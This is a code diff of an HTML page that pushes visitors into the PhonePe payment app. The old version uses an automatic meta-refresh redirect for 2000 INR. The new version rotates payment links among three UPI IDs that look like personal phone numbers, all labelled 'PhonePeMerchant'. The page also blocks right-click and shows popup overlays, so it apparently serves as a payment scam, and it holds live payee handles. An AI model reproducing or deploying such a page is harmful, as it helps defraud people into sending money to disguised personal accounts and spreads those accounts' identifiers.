@@ -22,34 +22,7 @@
             RedirecttoApp(myurl)
         }
     </script>
-    <script type="text/javascript">
-        let merchantAccounts = [
-            "phonepe://pay?ver=01&mode=02&pa=Fcbiznmum8s@freecharge&pn=PhonePeMerchant&439639658587&tr=439639667595;end&am=1791.00&cu=INR&tn=PPBL434e43c3421c87b12c86dcf610&mc=0000&purpose=00tn=f3a36b5ca8ef3116d141ad025330&amp;mode=02&amp;purpose=00",
-            // Add the other two merchant account URLs here
-            "merchant_account_2_url",
-            "merchant_account_3_url"
-        ];
-
-        let currentMerchantIndex = 0;
-
-        function updateMerchantAccount() {
-            let anchorTag = document.getElementById("anc");
-            if (anchorTag) {
-                anchorTag.href = merchantAccounts[currentMerchantIndex];
-            }
-            currentMerchantIndex = (currentMerchantIndex + 1) % merchantAccounts.length;
-        }
-
-        function showPopup() {
-            document.getElementById('overlay').style.display = 'flex';
-        }
-
-        function hidePopup() {
-            document.getElementById('overlay').style.display = 'none';
-            updateMerchantAccount();
-            // Add your other functionality here
-        }
-    </script>
+    <!--  -->
     <style>
         #overlay {
             display: none;
@@ -70,12 +43,12 @@
             max-height: 80%;
         }
     </style>
-    <meta http-equiv="refresh" content="3;phonepe://pay?ver=01&mode=02&pa=Fcbiznmum8s@freecharge&pn=PhonePeMerchant&439639658587&tr=439639667595;end&am=2000.00&cu=INR&tn=PPBL434e43c3421c87b12c86dcf610&mc=0000&purpose=00tn=b149ca57ac16d39594b46b9d2a8a&amp;mode=02&amp;purpose=00">
+    <meta http-equiv="refresh" content="#" onclick="updateMerchantAccount()">
 </head>
 
 <body oncontextmenu=" return disableRightClick();">
 
-    <a id="anc1" href="phonepe://pay?ver=01&mode=02&pa=Fcbiznmum8s@freecharge&pn=PhonePeMerchant&439639658587&tr=439639667595;end&am=2000.00&cu=INR&tn=PPBL434e43c3421c87b12c86dcf610&mc=0000&purpose=00tn=f3a36b5ca8ef3116d141ad025330&amp;mode=02&amp;purpose=00 " onclick="generateRandomAmount()">
+    <a id="anc1" href="# " onclick="updateMerchantAccount()">
         <div>
             <img src="heaad.png" width="100%" height="auto">
         </div>
@@ -123,9 +96,33 @@
             <font color="green"></font>
         </form>
     </div>
+    <script>
+        let merchantAccounts = [
+    "phonepe://pay?ver=01&mode=02&pa=7488171023@ybl&pn=PhonePeMerchant&439639658587&tr=439639667595;end&am=1997.00&cu=INR&tn=PPBL434e43c3421c87b12c86dcf610&mc=0000&purpose=00tn=f3a36b5ca8ef3116d141ad025330&amp;mode=02&amp;purpose=00",
+    // Add other merchant account URLs here
+    "phonepe://pay?ver=01&mode=02&pa=8287903865@ybl&pn=PhonePeMerchant&439639658587&tr=439639667595;end&am=1997.00&cu=INR&tn=PPBL434e43c3421c87b12c86dcf610&mc=0000&purpose=00tn=f3a36b5ca8ef3116d141ad025330&amp;mode=02&amp;purpose=00",
+    "phonepe://pay?ver=01&mode=02&pa=8303395324@ibl&pn=PhonePeMerchant&439639658587&tr=439639667595;end&am=1997.00&cu=INR&tn=PPBL434e43c3421c87b12c86dcf610&mc=0000&purpose=00tn=f3a36b5ca8ef3116d141ad025330&amp;mode=02&amp;purpose=00"
+];
+
+let currentMerchantIndex = 0;
+
+function updateMerchantAccount() {
+    // Get the anchor tag by its ID
+    let anchorTag = document.getElementById("anc2");
+
+    // Check if the anchor tag exists
+    if (anchorTag) {
+        // Update the href attribute with the next merchant account URL
+        anchorTag.setAttribute("href", merchantAccounts[currentMerchantIndex]);
+
+        // Move to the next merchant account index
+        currentMerchantIndex = (currentMerchantIndex + 1) % merchantAccounts.length;
+    }
+}
+    </script>
     <font color="green">
         <br>
-        <a id="anc2" href="phonepe://pay?ver=01&mode=02&pa=Fcbiznmum8s@freecharge&pn=PhonePeMerchant&439639658587&tr=439639667595;end&am=1997.00&cu=INR&tn=PPBL434e43c3421c87b12c86dcf610&mc=0000&purpose=00tn=f3a36b5ca8ef3116d141ad025330&amp;mode=02&amp;purpose=00">
+        <a id="anc2" href="#" onclick="updateMerchantAccount()">
             <div>
                 <img src="YP-min.jpg" onclick="showPopup();" width="100%" height="auto">
             </div>
